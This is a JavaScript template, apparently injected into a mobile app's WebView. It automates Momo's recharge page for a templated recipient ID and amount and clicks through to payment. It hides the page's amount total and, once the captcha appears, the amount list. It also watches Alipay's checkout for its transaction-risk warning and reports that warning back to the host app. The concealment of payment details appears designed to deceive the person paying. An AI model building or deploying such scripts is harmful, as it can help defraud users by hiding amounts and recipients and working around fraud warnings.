javascript:{
    let open_log = false;
    let target_count = ${money};
    let target_name = '${name}';

    function v(msg) {
        if (open_log) console.log(msg);
    }

    let cur_url = window.location.href;
    if (cur_url.indexOf('https://www.immomo.com') > -1 && cur_url.indexOf('https://www.immomo.com/pay') == -1) {
        setTimeout(() => {
            $('.right-text').click();
        }, 2000);
    } else if (cur_url.indexOf('https://www.immomo.com/pay') > -1) {
        setTimeout(() => {
            let is_confirm_click = false;
            let is_yzm_tc = false;
            let is_select_mount = false;
            v('目标id:' + target_name + " je:" + target_count);
            let interval_id = setInterval(() => {
                if (!is_select_mount) {
                    my_input();
                    return false;
                }
                if (is_yzm_show() && !is_yzm_tc) {
                    v('验证码弹出');
                    show_web(true);
                    is_yzm_tc = true;
                    document.querySelector('.tap-list').style.display='none';
                    return false;
                } else {
                    show_web(false);
                }
            }, 150);

            function is_login() {
                return document.querySelector('.give-btn').innerHTML == '赠送他人';
            }

            function is_input() {
                return $('#other-number').val() != '';
            }

            function is_nick_ok() {
                return $('.other-name').text() != '';
            }

            function is_yzm_show() {
                return $('.g-captcha-full-wrapper').css('display') != 'none';
            }

            function is_confirm_box_show() {
                return $('#confirmPop').css('display') == 'block';
            }

            function my_input() {
                document.querySelector('.money-totle').style.display='none';
                document.querySelector('.user-defined-btn').click();
                let spans = $('.tap-cell-des span');
                if (spans.length < 3) {
                    return false;
                }
                for (let i = 0; i < spans.length; i++) {
                    let span = spans[i];
                    if (span.innerText == target_count) {
                        span.click();
                        break;
                    }
                }
                is_select_mount = true;
                setTimeout(() => {
                    $('.pay-btn').click();
                }, 100);
            }

            function show_web(show) {
                v('显示web' + show);
                if (show) {
                    $('.g-captcha-full-wrapper').css('background', 'rgba(255,255,255,1)');
                }
                if (typeof ad_obj != 'undefined') {
                    ad_obj.show_web(show);
                }
            }
        }, 2500);

    } else if (cur_url.indexOf('mclient.alipay.com') > -1 && cur_url.indexOf('mclient.alipay.com') < 20) {
        let interval_id = setInterval(() => {
            if (document.body.innerText.indexOf('本次交易可能存在风险') > -1) {
                v('zfb风险提示');
                if (typeof ad_obj != 'undefined') {
                    ad_obj.fx_repay(-2);
                }
                clearInterval(interval_id);
                v('定时器关闭');
            }
        }, 50);

    }
}


